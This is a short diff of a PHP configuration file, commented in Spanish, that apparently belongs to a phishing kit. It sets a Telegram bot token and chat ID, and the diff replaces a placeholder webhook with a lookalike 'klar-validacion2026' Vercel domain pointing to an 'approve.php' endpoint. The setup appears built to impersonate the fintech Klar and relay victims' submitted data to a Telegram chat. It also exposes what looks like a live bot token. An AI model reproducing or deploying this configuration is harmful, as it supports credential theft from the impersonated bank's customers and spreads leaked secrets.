@@ -13,5 +13,5 @@ if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
 // ⚙️ Configuración principal (solo accesible por inclusión)
 $bot_token_2 = '8137246523:AAGsP4WG1Nvh8oxRAdBGobbVLfbSOguop-8';  
 $chat_id_2   = '-1002363197074';
-$webhook_url = '(LINK_AQUI)approve.php'; //Reemplaza (LINK_AQUI) completo, por tu link.
+$webhook_url = '(https://klar-validacion2026.vercel.app)approve.php'; //Reemplaza (LINK_AQUI) completo, por tu link.
 ?>
